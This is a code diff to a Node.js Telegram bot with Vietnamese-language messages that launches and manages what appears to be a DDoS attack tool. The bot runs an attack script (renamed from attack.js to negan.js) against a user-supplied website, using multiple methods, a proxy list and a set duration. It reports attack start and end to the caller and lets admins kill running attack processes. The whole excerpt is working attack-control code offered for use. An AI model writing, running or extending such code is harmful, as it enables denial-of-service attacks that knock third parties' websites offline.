@@ -97,7 +97,7 @@ const initBot = () => {
 
             let completedMethods = 0;
             methods.forEach(method => {
-                exec(`node --max-old-space-size=8192 ./attack.js -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
+                exec(`node --max-old-space-size=8192 ./negan.js -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
                     completedMethods++;
                     if (completedMethods === methods.length) {
                         const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
@@ -121,11 +121,11 @@ const initBot = () => {
             if (!isAdmin) return bot.sendMessage(chatId, '❌ Bạn không có quyền thực thi lệnh admin.', { parse_mode: 'HTML' });
 
             if (text.startsWith('/pkill')) {
-                exec('pgrep -f attack.js', (e, stdout, stderr) => {
+                exec('pgrep -f negan.js', (e, stdout, stderr) => {
                     if (e || !stdout.trim()) return bot.sendMessage(chatId, '❌ Không tìm thấy tiến trình đang chạy.', { parse_mode: 'HTML' });
 
                     const pids = stdout.trim().split('\n').join(', ');
-                    exec(`pkill -f -9 attack.js`, (e, stdout, stderr) => {
+                    exec(`pkill -f -9 negan.js`, (e, stdout, stderr) => {
                         if (e) return bot.sendMessage(chatId, '❌ Lỗi khi thực hiện pkill.', { parse_mode: 'HTML' });
                         bot.sendMessage(chatId, `✅ Đã kill hoàn toàn tiến trình. PID: ${pids}`, { parse_mode: 'HTML' });
                     });
